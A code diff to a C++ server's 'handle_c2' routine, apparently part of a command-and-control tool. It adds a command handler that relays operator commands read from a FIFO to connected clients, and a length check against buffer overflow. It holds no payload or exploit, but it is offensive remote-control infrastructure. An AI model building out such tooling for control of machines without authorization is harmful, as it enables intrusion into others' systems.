@@ -308,7 +308,9 @@ void Server::handle_c2() {
     c2_child_pid = pid;
 
     EventLog event_log(log_context_);
+    CommandHandler command_handler(&clients_, &event_log, &shutdown_flag_);
     ScopedEpollFD epoll_fd;
+    int rc = 0;
     epoll_fd.fd = epoll_create1(0);
     if (epoll_fd.fd == -1) {
         event_log << RED << "[Server::handle_c2] Error creating epoll instance: " << strerror(errno) << RESET;
@@ -366,8 +368,8 @@ void Server::handle_c2() {
                 read(shutdown_event_fd_.fd, &u, sizeof(u));
                 goto c2_cleanup;
             } else if (events[i].data.fd == fifo_fd) {
-                char buffer[256];
-                ssize_t bytes_read = read(fifo_fd, buffer, sizeof(buffer));
+                char buffer[MAX_COMMAND_LEN + 1];
+                ssize_t bytes_read = read(fifo_fd, buffer, MAX_COMMAND_LEN + 1);
                 if (bytes_read < 0) {
                     event_log << RED << "[Server::handle_c2] Error reading from FIFO: " << strerror(errno) << RESET;
                     goto c2_cleanup;
@@ -375,7 +377,12 @@ void Server::handle_c2() {
                     event_log << YELLOW << "[Server::handle_c2] C2 terminal closed" << RESET;
                     goto c2_cleanup;
                 } else {
-                    if (buffer[bytes_read - 1] == '\n') {
+                    if (bytes_read > MAX_COMMAND_LEN) {
+                        event_log << RED << "[Server::handle_c2] Are you trying to buffer overflow me?" << RESET;
+                        continue;
+                    }
+
+                    if (buffer[bytes_read - 1] == '\n' || buffer[bytes_read - 1] == '\r') {
                         bytes_read--;
                     }
                     buffer[bytes_read] = '\0';
@@ -386,6 +393,8 @@ void Server::handle_c2() {
                         shutdown_flag_ = true;
                         goto c2_cleanup;
                     }
+
+                    command_handler.execute_command(buffer, bytes_read);                    
                 }
             }
         }
